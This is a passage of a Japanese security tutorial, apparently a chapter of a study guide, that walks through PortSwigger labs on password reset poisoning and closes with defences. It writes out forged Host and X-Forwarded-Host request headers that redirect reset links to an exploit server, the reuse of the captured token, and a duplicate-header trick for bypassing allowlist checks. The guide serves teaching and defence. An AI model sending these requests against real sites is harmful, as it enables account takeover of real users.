```http
POST /forgot-password HTTP/1.1
Host: exploit-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx.exploit-server.net
Cookie: session=...
Content-Type: application/x-www-form-urlencoded
Content-Length: 20

username=carlos
```

4. このリクエストを送信すると、被害者 `carlos` 宛にリセットメールが送られる。ラボ環境ではメールは擬似メールクライアント画面で確認できるが、実運用ではもちろん被害者の実際の受信箱に届く。メール本文中のリンクは次のような形になっている。

```
https://exploit-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx.exploit-server.net/forgot-password?temp-forgot-password-token=46YPrs29m4vwmsH3bJNT874EjSO2rLUL
```

正規のドメインではなく、攻撃者が指定した `exploit-server.net` のサブドメインがリンクの宛先になっている点に注目したい。これはサーバー側が `Host` ヘッダをそのまま信頼してリンクの `<scheme>://<host>/...` 部分を組み立てた結果である。

5. 被害者（ラボでは自動的にリンクを踏むシミュレーションユーザーとして動作する）がこのリンクにアクセスすると、攻撃者が管理する Exploit Server の **Access log** にアクセス記録が残る。

```
GET /forgot-password?temp-forgot-password-token=46YPrs29m4vwmsH3bJNT874EjSO2rLUL HTTP/1.1
Host: exploit-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx.exploit-server.net
```

6. 攻撃者はこのログからトークン `46YPrs29m4vwmsH3bJNT874EjSO2rLUL` を取得し、**正規のドメイン**に対して以下のようにアクセスする。

```
https://<正規のラボ>.web-security-academy.net/forgot-password?temp-forgot-password-token=46YPrs29m4vwmsH3bJNT874EjSO2rLUL
```

トークンはサーバー側のDB上ではドメインに関係なく「有効なトークン」として扱われているため、正規ドメインにアクセスした時点でパスワード再設定フォームが表示され、被害者のパスワードを任意の値に上書きできてしまう。

> 出典: Basic Password Reset Poisoning — CyberiumX — https://cyberiumx.com/write-ups/portswigger-basic-password-reset-poisoning/
> 出典: PortSwigger's Basic Password Reset Poisoning Walkthrough — learnhacking.io — https://learnhacking.io/portswiggers-basic-password-reset-poisoning-walkthrough/

#### なぜこれで成立するのか（仕組みレベル）

サーバー実装（PortSwigger のラボはNode/Java系のバックエンドを模した教材アプリ）は、絶対URLを構築する際に典型的には次のような疑似コードに相当する処理を行っている。

```
host = request.headers['Host']
resetLink = "https://" + host + "/forgot-password?temp-forgot-password-token=" + token
sendEmail(user.email, resetLink)
```

`Host` ヘッダはHTTP/1.1で必須ヘッダではあるが、あくまで「クライアントが最初の接続行で指定した値」であり、サーバーが「自分自身の本当のホスト名」として検証すべき値ではない。ロードバランサやCDNを介さない単純な構成では、Webサーバー（nginx や Apache）が **バーチャルホスト選択** のためにこの値を使うことはあっても、アプリケーション層のコードがこれを「自分のドメイン名」として信頼してよいわけではない。この「サーバーが受け取った入力を、本来検証すべき信頼境界を越えて使い回してしまう」構造は、HTTP Host Header Injection の一種であり、パスワードリセットポイズニングはその代表的な悪用パターンの一つである。

### 3. Password Reset Poisoning via Middleware（CyberiumX）

前節のラボは「アプリケーションサーバーが直接 `Host` ヘッダを見る」単純な構成だったが、実運用ではアプリケーションの手前に **リバースプロキシ／ロードバランサ／APIゲートウェイなどのミドルウェア** が挟まっていることが多い。このミドルウェア層こそが2つ目のラボのテーマである。

#### ミドルウェア構成での挙動の違い

リバースプロキシ配下では、クライアントからの `Host` ヘッダはプロキシ自身のホスト名に固定・上書きされてしまうことが多い（プロキシがバックエンドへ転送する際、プロキシ自身の内部ホスト名やIPに書き換えるため）。したがって単純に `Host` ヘッダだけを攻撃者ドメインに変更しても、バックエンドのアプリケーションはプロキシによって上書きされた正規の `Host` しか見えず、Basic版と同じ手口は通用しない。

しかし、多くのリバースプロキシ／アプリケーションフレームワークには **`X-Forwarded-Host` ヘッダを尊重してオリジナルのホスト名を復元する** 慣習がある。これは、プロキシが `Host` を自身のものに書き換える代わりに `X-Forwarded-Host: <クライアントが最初に指定したHost>` を付与し、バックエンドアプリ側がリンク生成やリダイレクト先URLの組み立て時に「`X-Forwarded-Host` があればそちらを優先する」という実装になっているためである（Expressの `trust proxy` 設定や、多くのWebフレームワークの `X-Forwarded-*` 系ヘルパーがこの挙動を持つ）。

#### 攻撃手順

1. まず素のBasic版と同じ手口（`Host` ヘッダの書き換えのみ）を試すが、ミドルウェアがそれを上書きしてしまうため、メール内のリンクは正規ドメインのままになる。
2. そこで `Host` ヘッダはそのままに（あるいは任意の値のまま）、**新たに `X-Forwarded-Host` ヘッダを追加**し、値に攻撃者の Exploit Server を指定する。

```http
POST /forgot-password HTTP/1.1
Host: vulnerable-website.com
X-Forwarded-Host: exploit-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx.exploit-server.net
Cookie: session=...
Content-Type: application/x-www-form-urlencoded
Content-Length: 20

username=carlos
```

3. バックエンドのリンク生成ロジックが「`X-Forwarded-Host` が存在すればそれを優先してホスト名として使う」実装になっている場合、送信されるリセットメールのリンクは再び攻撃者ドメインを指すようになる。以降のトークン窃取・悪用手順はBasic版と同一である。

> ⚠️ 本ライトアップの取得結果には、「`X-Forwarded-Host` が単純な追加だけでは効かない場合にヘッダを重複させて回避する」といった、より進んだ回避テクニックの具体的な記述は含まれていなかった。以下は一般知識に基づく補足である。

（以下は一般知識に基づく補足）PortSwigger の公式解説やHost Header関連の研究では、`X-Forwarded-Host` を一段では処理しない、あるいは末尾の値のみを信用する実装に対して、**同名ヘッダを複数回送る**ことで検証ロジックとリンク生成ロジックの間の不一致（パーサ間の解釈違い、いわゆる desync 的な発想）を突く手法が知られている。

```http
X-Forwarded-Host: vulnerable-website.com
X-Forwarded-Host: exploit-server.net
```

多くのHTTPライブラリは複数の同名ヘッダを受け取った際、「最初の値を使うもの」と「最後の値を使うもの」「カンマ区切りで連結してしまうもの」に実装が割れる。セキュリティチェック（許可ドメインのホワイトリスト照合）が先頭値を見て判定を通し、実際のリンク生成コードが末尾値を採用する、といった**検証と利用のロジックが異なるヘッダ解釈をしてしまう不一致（パーサ差異）**が存在すると、ホワイトリスト検証をすり抜けたまま攻撃者ドメインでリンクが生成されてしまう。これはHTTP Request Smugglingで問題になる「複数のパーサが同じヘッダ集合を異なる方法で解釈する」構造と本質的に同根であり、Host Header系の脆弱性でも頻出するパターンである。

> 出典: Password Reset Poisoning via Middleware — CyberiumX — https://cyberiumx.com/write-ups/portswigger-password-reset-poisoning-via-middleware/

### 4. なぜミドルウェアは `X-Forwarded-Host` を無条件で信頼してしまうのか

`X-Forwarded-For` / `X-Forwarded-Host` / `X-Forwarded-Proto` は、もともと **信頼できるリバースプロキシが、自分がクライアントから受け取った元のリクエスト情報をバックエンドに伝達するため**に生まれた事実上の標準ヘッダ群である。しかし、これらは正式なRFC標準（`Forwarded` ヘッダはRFC 7239で標準化されているが `X-Forwarded-*` 系は依然として広く使われる非標準の慣習）ではなく、**「誰がこのヘッダを設定してよいか」という信頼境界の定義がアプリケーション側に委ねられている**という弱点を抱える。

構成上の問題は主に2つに整理できる。

- **境界の取り違え**: リバースプロキシが「クライアントから来た `X-Forwarded-Host` を一度剥がして、プロキシ自身が生成した値に置き換える」処理を行わず、クライアントが送った値をそのまま透過させてしまうと、クライアント（攻撃者）が直接この値を偽装できてしまう。
- **多段プロキシでの責任の所在の曖昧さ**: CDN→WAF→ロードバランサ→アプリという多段構成では、どの層が「最初にクライアントから受け取った生の値を上書きする責任者」なのかが設定ミスにより曖昧になりやすく、最終的にアプリケーションが素朴に「ヘッダにある値=信頼できる元ホスト」として扱ってしまうケースが後を絶たない。

### 5. 影響（Impact）

この脆弱性が悪用された場合の影響は、アカウント乗っ取り（Account Takeover）そのものである。

- 被害者がリンクを一度クリックするだけで、攻撃者はパスワードリセットトークンを窃取できる。フィッシングのように偽サイトへの誘導や資格情報の直接入力を必要とせず、**正規のメールシステムから正規のトークンが送られてくる**ため、被害者・メールのスパムフィルタ双方から見て極めて自然に見え、検知が難しい。
- トークン窃取後は、攻撃者が正規ドメイン上で直接パスワードを再設定できるため、多要素認証（MFA）が設定されていても、パスワードリセット導線自体にMFA確認が組み込まれていない実装では、そのままアカウントの完全な乗っ取りにつながる。
- 管理者アカウントや特権ユーザーのユーザー名・メールアドレスが推測可能な場合、権限昇格の起点にもなり得る。

### 6. 防御策

3本のライトアップはいずれも防御策について詳細な記述を持たなかったため、以下は仕組みの分析から導かれる一般的な対策として補足する。

1. **リンク生成時に `Host` / `X-Forwarded-Host` を信用しない**: アプリケーション設定ファイルなどに、正規のベースURL（例: `https://example.com`）をハードコードまたは環境変数として固定し、リクエストヘッダから動的に組み立てない。これが最も確実な根本対策である。
2. **どうしても動的にホストを扱う必要がある場合はホワイトリスト検証を行う**: 許可されたホスト名の集合と厳密一致で照合し、一致しなければリクエストを拒否する。この際、検証ロジックとリンク生成ロジックが**同一の解釈でヘッダ値を読む**ことを保証する（前述のヘッダ重複による不一致を防ぐため、重複ヘッダはエラーとして拒否するか、先頭・末尾どちらを使うかをスタック全体で統一する）。
3. **信頼できるプロキシ以外からの `X-Forwarded-*` 系ヘッダを除去する**: エッジのリバースプロキシ（インターネットに直接面する層）で、クライアントから到達したリクエストに含まれる `X-Forwarded-Host` 等を一旦強制的に削除・上書きしてから内部に転送する。多段プロキシ構成では、各段で「自分より外側から来た `X-Forwarded-*` は信頼しない」という原則を徹底する。
4. **トークンをワンタイム・短命化し、パスワード変更完了後は即座に無効化する**: トークン自体の窃取をゼロにはできなくても、有効期限を短く（数分〜数十分）設定し、一度使用したトークンは即座に失効させることで、悪用の時間的猶予を最小化する。
5. **リセット完了時に元のメールアドレスへ通知を送る**: パスワードが変更されたことを検知できるよう、正規のユーザーにも通知メールを送信し、身に覚えのない変更があれば即座に気づける経路を用意する。

本節で見た2つのラボは、いずれも「サーバーが信頼すべきでない入力（クライアント由来のHostヘッダ）を、信頼すべき出力（メールで送るリンクの宛先ドメイン）の材料にしてしまう」という、Host Header Injection系脆弱性に共通する設計ミスの具体例である。パスワードリセット導線を実装・レビューする際は、「このリンクのドメイン部分はどこから来ているか」を必ず追跡し、リクエストヘッダに由来する値であれば即座に設計の見直しを検討すべきである。

---

## ナビゲーション

← [第5章 MFA／2FAバイパス](05-mfa-bypass.md)  ｜  [📚 目次（ホーム）](index.md)  ｜  [第7章 アカウント乗っ取り（ATO）への統合](07-account-takeover.md) →
